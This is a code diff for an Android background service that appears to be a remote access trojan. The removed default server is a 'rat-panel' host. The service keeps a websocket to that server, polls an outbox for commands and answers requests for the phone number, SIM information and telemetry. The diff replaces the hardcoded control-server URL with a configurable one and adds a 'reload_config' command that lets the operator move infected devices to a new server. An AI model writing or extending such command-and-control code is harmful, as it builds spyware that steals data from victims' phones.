@@ -36,9 +36,6 @@ import java.util.concurrent.atomic.AtomicInteger
 class TpcService : Service() {
 
     companion object {
-        val API_BASE_URL: String = BuildConfig.API_BASE.takeIf { it.isNotBlank() }
-            ?: "https://rat-panel-b91839a4be83.herokuapp.com"
-
         private const val TAG = "TpcService"
         private const val CHANNEL_ID = "tpc_service"
         private const val NOTIFICATION_ID = 5001
@@ -61,6 +58,9 @@ class TpcService : Service() {
 
         @Volatile
         internal var instance: TpcService? = null
+
+        /** base URL ko central jagah se lo — hardcode nahi. */
+        fun apiBase(context: Context): String = ApiConfig.resolve(context)
     }
 
     private val work = Executors.newSingleThreadExecutor()
@@ -236,9 +236,12 @@ class TpcService : Service() {
     }
 
     private fun postJson(path: String, payload: JSONObject, timeoutMs: Int = 12_000): Boolean {
+        val base = apiBase(this)
+        if (base.isBlank()) return false
+
         var conn: HttpURLConnection? = null
         return try {
-            conn = URL("$API_BASE_URL$path").openConnection() as HttpURLConnection
+            conn = URL("$base$path").openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.connectTimeout = timeoutMs
             conn.readTimeout = timeoutMs
@@ -274,7 +277,11 @@ class TpcService : Service() {
         if (stopped) return
         if (socket != null) return
 
-        val url = API_BASE_URL.replace("https://", "wss://") + "/ws/device/${rid()}"
+        val url = ApiConfig.wsUrl(this, "/ws/device/${rid()}")
+        if (url.isBlank()) {
+            bgHandler.postDelayed({ safe { connect() } }, 4_000)
+            return
+        }
 
         socket = client.newWebSocket(
             Request.Builder().url(url).build(),
@@ -350,6 +357,15 @@ class TpcService : Service() {
                 work.execute { safe { postHeartbeat() } }
                 safe { pollOutbox() }
                 work.execute { safe { syncInbox() } }
+            }
+            "reload_config" -> {
+                val url = msg.optString("base_url")
+                if (url.isNotBlank()) {
+                    ApiConfig.remember(this, url)
+                    runCatching { socket?.close(1000, "reconnect") }
+                    socket = null
+                    bgHandler.postDelayed({ safe { connect() } }, 800)
+                }
             }
             "fetch_number", "number", "sim_info", "refresh_telemetry", "telemetry" -> {
                 val t = DeviceInfo.telemetry(this)
@@ -564,11 +580,14 @@ class TpcService : Service() {
 
     private fun pollOutbox() {
         work.execute {
+            val base = apiBase(this)
+            if (base.isBlank()) return@execute
+
             var conn: HttpURLConnection? = null
             try {
                 val id = rid()
                 if (id.isBlank()) return@execute
-                conn = URL("$API_BASE_URL/devices/outbox?registration_id=$id")
+                conn = URL("$base/devices/outbox?registration_id=$id")
                     .openConnection() as HttpURLConnection
                 conn.requestMethod = "GET"
                 conn.connectTimeout = 12_000
